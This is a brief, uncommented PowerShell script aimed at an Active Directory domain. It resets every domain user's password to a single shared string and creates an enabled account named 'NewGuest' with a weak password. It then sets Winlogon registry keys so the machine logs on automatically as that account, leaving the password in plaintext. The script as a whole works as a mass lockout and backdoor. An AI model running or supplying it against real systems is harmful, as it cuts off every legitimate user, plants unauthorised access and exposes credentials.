Get-ADUser -filter * | Set-ADAccountPassword -Reset -NewPassword(ConvertTo-SecureString "super_Secure_R!ght???" -asPlainText -Force)
New-ADUser "NewGuest" -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -asPlainText -Force) -Enabled $True
$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$DefaultUsername = "NewGuest"
$DefaultPassword = "P@ssw0rd!"
Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
